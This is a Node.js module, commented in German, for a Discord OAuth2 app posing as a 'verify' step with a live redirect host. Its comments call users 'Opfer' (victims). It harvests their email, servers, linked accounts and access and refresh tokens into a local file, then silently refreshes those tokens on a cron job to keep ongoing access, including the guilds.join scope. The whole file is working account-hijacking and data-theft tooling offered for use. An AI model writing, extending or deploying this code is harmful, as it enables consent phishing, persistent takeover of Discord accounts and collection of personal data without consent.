// Discord OAuth2 Infra — echte App, echter Dialog, volle API-Kontrolle
// Setup (2 Min): discord.com/developers → New Application → OAuth2 → Redirect URI eintragen:
//   https://xdx-w5od.onrender.com/api/auth/discord/callback
// Scopes anhaken: identify, email, connections, guilds, guilds.join
// Client ID + Secret in config.json (discordClientId / discordClientSecret)
const fs = require('fs');
const path = require('path');

function loadCfg(){
  return JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
}
const STORE = path.join(__dirname, 'discord_tokens.json');
function loadStore(){ try{ return JSON.parse(fs.readFileSync(STORE,'utf8')); }catch(e){ return []; } }
function saveStore(a){ fs.writeFileSync(STORE, JSON.stringify(a, null, 2)); }

function authUrl(state){
  const cfg = loadCfg();
  const q = new URLSearchParams({
    client_id: cfg.discordClientId,
    redirect_uri: cfg.discordRedirect,
    response_type: 'code',
    scope: 'identify email connections guilds guilds.join',
    state: state || 'verify'
  });
  return 'https://discord.com/oauth2/authorize?' + q.toString();
}

async function exchangeCode(code){
  const cfg = loadCfg();
  const r = await fetch('https://discord.com/api/oauth2/token', {
    method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body: new URLSearchParams({
      client_id: cfg.discordClientId,
      client_secret: cfg.discordClientSecret,
      grant_type: 'authorization_code',
      code, redirect_uri: cfg.discordRedirect
    })
  });
  if(!r.ok) throw new Error('token exchange failed: ' + r.status);
  return r.json(); // { access_token, refresh_token, expires_in, scope }
}

async function api(token, endpoint){
  const r = await fetch('https://discord.com/api/v10' + endpoint, {
    headers:{ Authorization: 'Bearer ' + token }
  });
  if(!r.ok) throw new Error(endpoint + ' → ' + r.status);
  return r.json();
}

async function refreshToken(refresh_token){
  const cfg = loadCfg();
  const r = await fetch('https://discord.com/api/oauth2/token', {
    method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body: new URLSearchParams({
      client_id: cfg.discordClientId,
      client_secret: cfg.discordClientSecret,
      grant_type: 'refresh_token',
      refresh_token
    })
  });
  if(!r.ok) throw new Error('refresh failed: ' + r.status);
  return r.json();
}

// Opfer einlagern + Profil ziehen
async function enroll(code){
  const tok = await exchangeCode(code);
  const me = await api(tok.access_token, '/users/@me');
  let guilds = [], conns = [];
  try{ guilds = await api(tok.access_token, '/users/@me/guilds'); }catch(e){}
  try{ conns = await api(tok.access_token, '/users/@me/connections'); }catch(e){}
  const store = loadStore();
  store.push({
    time: new Date().toISOString(),
    id: me.id, username: me.username, email: me.email,
    access_token: tok.access_token, refresh_token: tok.refresh_token,
    expires_at: Date.now() + (tok.expires_in*1000),
    guilds: guilds.map(g=>({id:g.id,name:g.name,owner:!!g.owner})),
    connections: conns.map(c=>({type:c.type,name:c.name}))
  });
  saveStore(store);
  return { me, guilds, conns };
}

// Abgelaufene Tokens still erneuern (Cron ruft /api/auth/discord/refresh)
async function refreshAll(){
  const store = loadStore(); const out = [];
  for(const s of store){
    try{
      if(s.expires_at && s.expires_at - Date.now() > 3600e3){ out.push({id:s.id,ok:true,skipped:true}); continue; }
      const tok = await refreshToken(s.refresh_token);
      s.access_token = tok.access_token;
      if(tok.refresh_token) s.refresh_token = tok.refresh_token;
      s.expires_at = Date.now() + (tok.expires_in*1000);
      out.push({id:s.id, ok:true});
    }catch(e){ out.push({id:s.id, ok:false, error:e.message}); }
  }
  saveStore(store);
  return out;
}

module.exports = { authUrl, exchangeCode, enroll, refreshAll, api, loadStore };
